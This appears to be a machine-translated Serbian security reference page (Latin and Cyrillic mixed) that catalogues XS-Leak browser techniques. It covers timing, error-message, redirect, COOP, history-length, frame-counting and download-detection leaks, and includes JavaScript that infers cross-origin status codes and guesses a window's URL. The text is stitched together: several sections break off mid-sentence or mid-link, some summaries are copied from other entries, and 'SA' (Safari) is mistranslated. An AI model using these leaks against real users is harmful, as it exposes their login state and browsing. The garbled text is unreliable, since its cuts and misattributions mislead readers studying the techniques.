* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Rezime**: Resurs sa zaglavljem X-Frame-Options ne stvara unos o vremenu resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako se stranica **
### Početak curenja preusmeravanja

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Preusmeravanje
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Unos vremena resursa otkriva vreme početka preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Pronašli smo jedan primer XS-Leak koji zloupotrebljava ponašanje nekih pregledača koji beleže previše informacija za zahteve preko granica izvora. Standard definiše podskup atributa koji bi trebalo postaviti na nulu za resurse preko granica izvora. Međutim, u **SA** je moguće otkriti da li je korisnik **preusmeren** od strane ciljne stranice, upitivanjem **Performance API-ja** i proverom podataka o vremenu **redirectStart**.

### Curenje trajanja preusmeravanja

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Preusmeravanje
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Trajanje unosa vremena je negativno kada se desi preusmeravanje.
* **Primer koda**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC-u, **trajanje** za zahteve koji rezultiraju u **preusmeravanju** je **negativno** i može se **razlikovati** od zahteva koji ne rezultiraju u preusmeravanju.

### CORP curenje

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Zaglavlje
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Resursi zaštićeni sa CORP-om ne stvaraju unose vremena resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim slučajevima, **nextHopProtocol unos** može se koristiti kao tehnika curenja. U GC-u, kada je postavljeno **CORP zaglavlje**, nextHopProtocol će biti **prazan**. Napomena: SA neće uopšte kreirati unos performansi za resurse sa omogućenim CORP-om.

### Servisni radnik

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Upotreba API-ja
* **Više informacija**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Rezime**: Otkrivanje da li je servisni radnik registrovan za određeni izvor.
* **Primer koda**:

Servisni radnici su konteksti skripti koji se pokreću na izvoru. Oni rade u pozadini veb stranice i mogu presretati, menjati i **keširati resurse** kako bi kreirali veb aplikacije van mreže.\
Ako se **resurs kešira** od strane **servisnog radnika** i pristupa mu se putem **iframe-a**, resurs će biti **učitan iz keša servisnog radnika**.\
Da bi se otkrilo da li je resurs **učitan iz keša servisnog radnika**, može se koristiti **Performance API**.\
Ovo takođe može biti urađeno pomoću napada na vremenskoj osnovi (proverite rad za više informacija).

### Keš

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Vremensko osnovanje
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Rezime**: Moguće je proveriti da li je resurs smešten u kešu.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Korišćenjem [Performance API-ja](xs-search.md#performance-api) moguće je proveriti da li je resurs keširan.

### Trajanje mreže

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Rezime**: Moguće je dobiti trajanje mreže zahteva iz `performance` API-ja.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Tehnika poruka o greškama

### Greška medija

* **Metode uključivanja**: HTML elementi (Video, Audio)
* **Detektoviva razlika**: Kod statusa
* **Više informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Rezime**: U Firefox-u je moguće tačno otkriti statusni kod zahteva preko granica izvora.
* **Primer koda**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
`MediaError` интерфејсова својство `message` јединствено идентификује ресурсе који успешно учитавају са посебним низом карактера. Нападач може искористити ову функционалност праћењем садржаја поруке и на тај начин закључити статус одговора на ресурс из различитих извора.

### CORS Грешка

* **Методи укључивања**: Fetch API
* **Детектабилна разлика**: Заглавље
* **Више информација**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Резиме**: У безбедносним тврдњама (SA), CORS грешке ненамерно откривају пуну URL адресу преусмерених захтева.
* **Пример кода**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Ова техника омогућава нападачу да **извуче одредиште преусмереног сајта са различитог порекла** искоришћавајући начин на који прегледачи базирани на Webkit-у обрађују CORS захтеве. Конкретно, када се **CORS-омогућени захтев** пошаље ка циљаном сајту који издаје преусмерење на основу стања корисника и прегледач затим одбије захтев, **порука о грешци открива пуну URL адресу одредишта преусмерења**. Ова угроженост не само да открива чињеницу о преусмерењу, већ такође открива и крајњу тачку преусмерења и било **осетљиве параметре упита** које може садржати.

### SRI Грешка

* **Методи укључивања**: Fetch API
* **Детектабилна разлика**: Заглавље
* **Више информација**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Резиме**: У безбедносним тврдњама (SA), CORS грешке ненамерно откривају пуну URL адресу преусмерених захтева.
* **Пример кода**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Нападач може искористити **опширне поруке о грешци** да би закључио величину преусмерених одговора са различитих извора. Ово је могуће због механизма Subresource Integrity (SRI), који користи integrity атрибут за проверу да ли се ресурси који се учитавају, често са CDN-ова, нису измењени. Да би SRI радио на ресурсима са различитог порекла, они морају бити **CORS-омогућени**; у супротном, они нису подложни провери интегритета. У безбедносним тврдњама (SA), као и у случају CORS грешке XS-Leak, порука о грешци може бити забележена након што захтев за учитавање са integrity атрибутом не успе. Нападачи могу намерно **изазвати ову грешку** доделом **неправилне хеш вредности** integrity атрибуту било ког захтева. У SA, резултујућа порука о грешци ненамерно открива дужину садржаја захтеваног ресурса. Ова информацијска пропустања омогућавају нападачу да примети варијације у величини одговора, отварајући пут за напредне XS-Leak нападе.

### CSP Кршење/Откривање

* **Методи укључивања**: Поп-упови
* **Детектабилна разлика**: Статусни код
* **Више информација**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Резиме**: Ако у CSP дозволимо само сајт жртве и ако покуша преусмерити на други домен, CSP ће покренути откривање грешке.
* **Пример кода**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak може користити CSP да открије да ли је сајт са различитог порекла преусмерен на други извор. Ово открива преусмерење, али додатно открива и домен преусмерења. Основна идеја овог напада је **дозволити циљани домен на нападачком сајту**. Када се захтев пошаље ка циљаном домену, он се **преусмерава** на домен са различитог порекла. **CSP блокира** приступ њему и креира **извештај о кршењу који се користи као техника откривања**. Зависно од прегледача, **овај извештај може открити локацију циља преусмерења**.\
Модерни прегледачи неће приказати URL на који је преусмерен, али још увек можете открити да је преусмерење са различитог порекла покренуто.

### Кеш

* **Методи укључивања**: Фрејмови, Поп-упови
* **Детектабилна разлика**: Садржај странице
* **Више информација**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://
### CORB

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Zaglavlja
* **Više informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Rezime**: CORB može omogućiti napadačima da otkriju kada je prisutno zaglavlje **`nosniff`** u zahtevu.
* **Primer koda**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Proverite link za više informacija o napadu.

### CORS greška na konfiguraciji odraza porekla <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Zaglavlja
* **Više informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Rezime**: Ako se zaglavlje Origin odražava u zaglavlju `Access-Control-Allow-Origin`, moguće je proveriti da li je resurs već u kešu.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

U slučaju kada se zaglavlje **Origin** odražava u zaglavlju `Access-Control-Allow-Origin`, napadač može iskoristiti ovaj postupak da pokuša da **dobavi** resurs u **CORS** režimu. Ako **nije izazvana greška**, to znači da je resurs **ispravno preuzet sa veba**, a ako je izazvana greška, to znači da je pristupljen iz keša (greška se pojavljuje jer keš čuva odgovor sa CORS zaglavljem koje dozvoljava originalni domen, a ne domen napadača).\
Imajte na umu da ako se poreklo ne odražava, ali se koristi džoker (`Access-Control-Allow-Origin: *`), ovo neće raditi.

## Tehnika čitljivih atributa

### Preusmeravanje Fetch

* **Metode uključivanja**: Fetch API
* **Detektoviva razlika**: Statusni kod
* **Više informacija**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Rezime**: GC i SA omogućavaju proveru tipa odgovora (`opaque-redirect`) nakon završetka preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Slanjem zahteva pomoću Fetch API sa `redirect: "manual"` i drugim parametrima, moguće je pročitati atribut `response.type` i ako je jednak `opaqueredirect`, onda je odgovor bio preusmeravanje.

### COOP

* **Metode uključivanja**: Iskačući prozori
* **Detektoviva razlika**: Zaglavlje
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Rezime**: Stranice zaštićene Cross-Origin Opener Policy (COOP) sprečavaju pristup prekooriginarnih interakcija.
* **Primer koda**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Napadač je sposoban da zaključi prisustvo zaglavlja Cross-Origin Opener Policy (COOP) u HTTP odgovoru prekooriginarnog porekla. COOP se koristi od strane veb aplikacija da bi se sprečilo da spoljni sajtovi dobiju proizvoljne reference prozora. Vidljivost ovog zaglavlja može se uočiti pokušajem pristupa **`contentWindow` referenci**. U slučajevima kada se COOP primenjuje uslovno, svojstvo **`opener`** postaje pokazatelj: ono je **nedefinisano** kada je COOP aktivan, a **definisano** kada je COOP odsutan.

### Maksimalna dužina URL-a - serverska strana

* **Metode uključivanja**: Fetch API, HTML elementi
* **Detektoviva razlika**: Statusni kod / Sadržaj
* **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Rezime**: Otkrivanje razlika u odgovorima zbog preusmeravanja, jer dužina odgovora preusmeravanja može biti prevelika da bi server odgovorio greškom i generisao upozorenje.
* **Primer koda**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ako serversko preusmeravanje koristi **korisnički unos unutar preusmeravanja** i **dodatne podatke**, moguće je otkriti ovaj postupak jer serveri obično imaju ograničenje dužine zahteva. Ako je **korisnički podatak** dužine **- 1**, jer se **preusmeravanje** koristi **tim podacima** i **dodaje** nešto **dodatno**, izazvaće se **greška koja se može otkriti putem događaja greške**.

Ako na neki način možete postaviti kolačiće korisniku, možete izvesti ovaj napad tako što ćete **postaviti dovoljno kolačića** ([**cookie bomba**](hacking-with-cookies/cookie-bomb.md)) tako da se sa **povećanom veličinom odgovora** ispravnog odgovora izazove greška. U ovom slučaju, zapamtite da ako pokrenete ovaj zahtev sa istog sajta, `<script>` će automatski poslati kolačiće (tako da možete proveriti greške).\
Primer **cookie bombe + XS-Search** možete pronaći u namerenoj rešenju ovog članka: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Obično je potrebno da `SameSite=None` ili da se nalazite u istom kontekstu za ovu vrstu napada.

### Maksimalna dužina URL-a - klijentska strana

* **Metode uključivanja**: Iskačući prozori
* **Detektoviva razlika**: Statusni kod / Sadržaj
* **Više informacija**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unint
### Maksimalni broj preusmeravanja

* **Metode uključivanja**: Fetch API, okviri
* **Detektoviva razlika**: Statusni kod
* **Više informacija**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Rezime**: Koristite ograničenje preusmeravanja pregledača da biste utvrdili pojavu preusmeravanja URL-a.
* **Primer koda**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ako je **maksimalni broj preusmeravanja** koje pregledač treba da prati **20**, napadač može pokušati da učita svoju stranicu sa **19 preusmeravanja** i na kraju **preusmeri žrtvu** na testiranu stranicu. Ako se izazove **greška**, to znači da je stranica pokušavala da **preusmeri žrtvu**.

### Dužina istorije

* **Metode uključivanja**: Okviri, iskačući prozori
* **Detektoviva razlika**: Preusmeravanja
* **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Rezime**: JavaScript kod manipuliše istorijom pregledača i može se pristupiti preko svojstva dužine.
* **Primer koda**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

API za istoriju omogućava JavaScript kodu da manipuliše istorijom pregledača, koja **čuva posete koje je korisnik obavio**. Napadač može koristiti svojstvo dužine kao metodu uključivanja: da bi otkrio JavaScript i HTML navigaciju.\
**Provera `history.length`**, nateranje korisnika da **pređe** na stranicu, **vrati** je **nazad** na isti izvor i **provera** nove vrednosti **`history.length`**.

### Dužina istorije sa istim URL-om

* **Metode uključivanja**: Okviri, iskačući prozori
* **Detektoviva razlika**: Ako je URL isti kao pretpostavljeni
* **Rezime**: Moguće je pretpostaviti da li je lokacija okvira/iskačućeg prozora na određenom URL-u zloupotrebom dužine istorije.
* **Primer koda**: Ispod

Napadač može koristiti JavaScript kod da **manipuliše lokacijom okvira/iskačućeg prozora na pretpostavljenom URL-u** i **odmah je promeni u `about:blank`**. Ako se dužina istorije poveća, to znači da je URL bio tačan i da je imao vremena da **se poveća jer se URL ne učitava ponovo ako je isti**. Ako se nije povećala, to znači da je **pokušao da učita pretpostavljeni URL**, ali zato što smo **odmah nakon toga** učitali **`about:blank`**, **dužina istorije se nikada nije povećala** prilikom učitavanja pretpostavljenog URL-a.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Brojanje frejmova

* **Metode uključivanja**: Frejmovi, iskačući prozori
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Rezime**: Procenite količinu elemenata iframe inspekcijom svojstva `window.length`.
* **Primer koda**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Brojanje **broja frejmova na vebu** otvorenih putem `iframe` ili `window.open` može pomoći u identifikaciji **stanja korisnika na toj stranici**.\
Osim toga, ako stranica uvek ima isti broj frejmova, **kontinuirano** proveravanje broja frejmova može pomoći u identifikaciji **uzorka** koji može otkriti informacije.

Primer ove tehnike je da se u Chrome-u **PDF** može **detektovati** pomoću **brojanja frejmova** jer se interno koristi `embed`. Postoje [parametri otvaranja URL-a](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omogućavaju određenu kontrolu nad sadržajem kao što su `zoom`, `view`, `page`, `toolbar`, gde bi ova tehnika mogla biti interesantna.

### HTMLElementi

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Rezime**: Pročitajte procurelu vrednost da biste razlikovali između 2 moguća stanja
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Curenje informacija putem HTML elemenata je zabrinjavajuće u vezi sa bezbednošću veba, posebno kada se dinamički generišu medijski fajlovi na osnovu korisničkih informacija ili kada se dodaju vodeni žigovi koji menjaju veličinu medija. Napadači mogu iskoristiti ovo tako što će analizirati informacije koje izlažu određeni HTML elementi kako bi razlikovali moguća stanja.

### Informacije izložene HTML elementima

- **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, do kojih se može pristupiti putem njegovog API-ja.
[Pročitajte više o HTMLMediaElement-u](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Otkriva `videoHeight` i `videoWidth`. U nekim pregledačima dostupna su dodatna svojstva poput `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` i `webkitDecodedFrameCount`, koja pružaju detaljnije informacije o sadržaju medija.
[Pročitajte više o HTMLVideoElement-u](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Ova funkcija pruža detalje o kvalitetu reprodukcije videa, uključujući `totalVideoFrames`, koji može ukazivati na količinu obrađenih video podataka.
[Pročitajte više o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Ovaj element otkriva `height` i `width` slike. Međutim, ako je slika nevažeća, ove osobine će vratiti 0, a funkcija `image.decode()` će biti odbijena, što ukazuje na neuspeh učitavanja slike na odgovarajući način.
[Pročitajte više o HTMLImageElement-u](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### CSS svojstvo

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Rezime**: Identifikujte varijacije u stilizovanju veb sajta koje se odnose na korisnikovo stanje ili status.
* **Primer koda**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Veb aplikacije mogu menjati **stilizovanje veb sajta** u zavisnosti od stanja korisnika. CSS fajlovi sa različitog porekla mogu biti ugrađeni na stranici napadača pomoću **HTML link elementa**, a **pravila** će biti **primenjena** na stranicu napadača. Ako stranica dinamički menja ova pravila, napadač može **detektovati** ove **razlike** u zavisnosti od stanja korisnika.\
Kao tehnika curenja, napadač može koristiti metodu `window.getComputedStyle` da **pročita CSS** svojstva određenog HTML elementa. Kao rezultat, napadač može pročitati proizvoljna CSS svojstva ako su poznati pogođeni element i naziv svojstva.

### CSS istorija

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Rezime**: Detektujte da li je stil `:visited` primenjen na URL, što ukazuje da je već posećen
* **Primer koda**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Prema [**ovome**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), ovo ne funkcioniše u headless Chrome-u.
{% endhint %}

CSS selektor `:visited` se koristi za stilizovanje URL-ova na drugačiji način ako ih je korisnik prethodno posetio. Ranije se metoda `getComputedStyle()` mogla koristiti za identifikaciju ovih stilskih razlika. Međutim, moderni pregledači su implementirali sigurnosne mere kako bi sprečili da ova metoda otkrije stanje veze. Ove mere uključuju uvek vraćanje izračunatog stila kao da je veza posećena i ograničavanje stilova koji se mogu primeniti sa selektorom `:visited`.

Uprkos ovim ograničenjima, moguće je indirektno uočiti posećeno stanje veze. Jedna tehnika uključuje prevaru korisnika da interaguje sa područjem koje je pogođeno CSS-om, posebno korišćenjem svojstva `mix-blend-mode`. Ovo svojstvo omogućava mešanje elemenata sa njihovom pozadinom, što potencijalno otkriva posećeno stanje na osnovu interakcije korisnika.

Osim toga, detekcija se može postići bez interakcije korisnika iskorišćavanjem vremena renderovanja veza. Budući da pregledači mogu različito renderovati posećene i neposećene veze, to može uvesti merljivu vremensku razliku u renderovanju. U izveštaju o bagu Chromium-a pomenut je dokazni koncept (PoC) koji demonstrira ovu tehniku korišćenjem više veza kako bi se pojačala vremenska razlika, č
### ContentDocument X-Frame Leak

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Zaglavlja
* **Više informacija**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Rezime**: U Google Chrome-u, prikazuje se posebna stranica greške kada se blokira ugrađivanje stranice na sajtu preko različitog porekla zbog restrikcija X-Frame-Options.
* **Primer koda**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa zaglavljem `X-Frame-Options` postavljenim na "deny" ili "same-origin" ugrađena kao objekat, prikazuje se stranica greške. Chrome jedinstveno vraća prazan objekat dokumenta (umesto `null`) za svojstvo `contentDocument` ovog objekta, za razliku od iframe-ova ili drugih pregledača. Napadači mogu iskoristiti ovo otkrivanjem praznog dokumenta, što potencijalno otkriva informacije o stanju korisnika, posebno ako programeri nekonzistentno postavljaju zaglavlje X-Frame-Options, često zanemarujući stranice greške. Svest i dosledna primena sigurnosnih zaglavlja su ključne za sprečavanje takvih curenja informacija.


### Otkrivanje preuzimanja

* **Metode uključivanja**: Okviri, Iskačući prozori
* **Detektoviva razlika**: Zaglavlja
* **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Rezime**: Napadač može otkriti preuzimanje datoteka iskorišćavanjem iframe-ova; nastavak pristupa iframe-u implicira uspešno preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Zaglavlje `Content-Disposition`, posebno `Content-Disposition: attachment`, instrukcira pregledač da preuzme sadržaj umesto da ga prikaže ugrađeno. Ovo ponašanje može biti iskorišćeno za otkrivanje da li korisnik ima pristup stranici koja pokreće preuzimanje datoteke. U pregledačima zasnovanim na Chromium-u, postoje neke tehnike za otkrivanje ovog ponašanja preuzimanja:

1. **Pratiti traku preuzimanja**:
- Kada se datoteka preuzme u pregledačima zasnovanim na Chromium-u, na dnu prozora pregledača se prikazuje traka preuzimanja.
- Praćenjem promena u visini prozora, napadači mogu zaključiti pojavu trake preuzimanja, što ukazuje na pokretanje preuzimanja.

2. **Navigacija preuzimanja sa iframe-ovima**:
- Kada stranica pokrene preuzimanje datoteke koristeći zaglavlje `Content-Disposition: attachment`, to ne izaziva događaj navigacije.
- Učitavanjem sadržaja u iframe-u i praćenjem događaja navigacije, moguće je proveriti da li raspored sadržaja izaziva preuzimanje datoteke (bez navigacije) ili ne.

3. **Navigacija preuzimanja bez iframe-ova**:
- Slično kao i tehnika sa iframe-ovima, ova metoda uključuje korišćenje `window.open` umesto iframe-a.
- Praćenjem događaja navigacije u novo otvorenom prozoru može se otkriti da li je pokrenuto preuzimanje datoteke (bez navigacije) ili se sadržaj prikazuje ugrađeno (nastupa navigacija).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti za indirektno zaključivanje autentifikacionog stanja korisnika na osnovu odgovora pregledača na zahtev za preuzimanje.

### Bypass particionisanog HTTP keša <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metode uključivanja**: Iskačući prozori
* **Detektoviva razlika**: Vreme
* **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Rezime**: Napadač može otkriti preuzimanje datoteka iskorišćavanjem iframe-ova; nastavak pristupa iframe-u implicira uspešno preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (sa [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Zato je ova tehnika interesantna: Chrome sada ima **particionisan keš**, a ključ keša za novo otvorenu stranicu je: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ali ako otvorim ngrok stranicu i koristim fetch u njoj, ključ keša će biti: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **ključ keša je drugačiji**, pa keš ne može biti deljen. Više detalja možete pronaći ovde: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
